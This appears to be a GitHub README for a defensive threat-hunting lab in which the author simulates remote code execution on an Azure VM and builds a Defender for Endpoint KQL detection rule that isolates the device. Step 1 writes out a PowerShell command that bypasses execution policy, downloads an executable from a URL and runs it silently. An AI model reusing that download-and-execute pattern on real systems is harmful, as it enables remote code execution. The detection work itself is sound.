# Remote-Code-Execution-Detection

<img width="1200" height="628" alt="image" src="https://github.com/user-attachments/assets/ced5c5b5-8ccb-49de-8140-7cf3bf25c93b" />

# Threat Hunt Project: Remote Code Execution Detection
- Goal : Demonstrate the use of Microsoft Defender for Endpoint (MDE) to detect and respond to remote code execution activity using PowerShell, by creating a custom detection rule that automatically isolates compromised devices.

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Powershell

##  Scenario
This project simulates a remote code execution (RCE) attempt using PowerShell to download and execute an external application (7-Zip).
The objective was to:

1. Generate process telemetry through a controlled PowerShell script.

2. Identify the malicious behavior in Defender for Endpoint using KQL queries.

3. Create a custom detection rule that automatically raises an alert, creates an incident, and isolates the endpoint from the network.





---

## Steps Taken

### 1. Simulate the Attack and Generate Logs

I accessed the Azure virtual machine and executed the PowerShell script to simulate malicious activity and generate telemetry for Defender for Endpoint.

Powershell Script: cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait" 



<img width="1928" height="1269" alt="Screenshot (815)" src="https://github.com/user-attachments/assets/a5315118-550d-4d06-9c8d-08ba9a313cb2" />







### 2. Analyzed the `DeviceProcessEvents` Table with KQL

Using Advanced Hunting, I searched the DeviceProcessEvents table for evidence of the command execution.
The goal was to locate PowerShell activity containing both Invoke-WebRequest and Start-Process — indicators of script-based remote execution.. 

**Query used to locate event:**

```kql

let target_machine = "compromisedmb";
DeviceProcessEvents
| where DeviceName == target_machine
| where AccountName != "system"
| where InitiatingProcessCommandLine has_all ("Invoke-WebRequest", "Start-Process")
| order by Timestamp desc 
```



---

### 3. Build a Custom Detection Rule

After validating the query, I converted it into a custom detection rule that:

Runs automatically in real-time.

Triggers a High Severity Alert and Incident when a match is found.

Automatically isolates the affected device to contain potential lateral movement.

Collects an Investigation Package for forensic review..





<img width="2996" height="1628" alt="Screenshot (816)" src="https://github.com/user-attachments/assets/b191c80c-9ff2-404f-b81a-933331cedaf8" />


---

### 4.: Validate the Detection & Response.

I re-executed the malicious PowerShell command on the virtual machine to confirm the rule worked as expected.


<img width="3072" height="1601" alt="Screenshot (817)" src="https://github.com/user-attachments/assets/7d094880-0154-4482-a486-a07ce58ce533" />


---

## 5. The Detection Rule succesfully Mitigated the Security Threat

The rule successfully detected the behavior, generated an alert, created a correlated incident, and initiated automatic device isolation. The detection rule successfully identified the simulated RCE activity. Defender for Endpoint automatically contained the infected host by isolating it from the network. The Investigation Package was downloaded, capturing process trees, hashes, and execution context for further analysis.

<img width="3072" height="1620" alt="Screenshot (818)" src="https://github.com/user-attachments/assets/d225d3af-0778-4b1d-987d-f2b265deddf1" />

<img width="3072" height="1606" alt="Screenshot (819)" src="https://github.com/user-attachments/assets/0055e6b5-fba9-47f6-91a0-62bbaed33f96" />

<img width="3072" height="1631" alt="Screenshot (820)" src="https://github.com/user-attachments/assets/eedfe9f5-6614-4330-acc3-b19bc88c412c" />

<img width="3072" height="1618" alt="Screenshot (821)" src="https://github.com/user-attachments/assets/29c0a016-55d4-46fd-9769-0705262e7f37" />







## Summary

This project demonstrates my ability to detect and respond to endpoint-based cyber threats using Microsoft Defender for Endpoint (MDE).
I simulated a Remote Code Execution (RCE) attack in a controlled virtual environment by executing a PowerShell script that mimicked malicious behavior.
Using Kusto Query Language (KQL), I analyzed telemetry data from the DeviceProcessEvents table to identify the suspicious process activity, then engineered a custom detection rule that automatically generated a High-Severity alert, created an incident, and isolated the compromised device from the network.

Through this project, I showcased key skills in:

Threat detection and hunting

KQL query design and log analysis

Custom rule creation and automation

Incident response and device containment

This hands-on lab highlights my practical understanding of endpoint security operations, EDR detection engineering, and real-world SOC workflows.
---


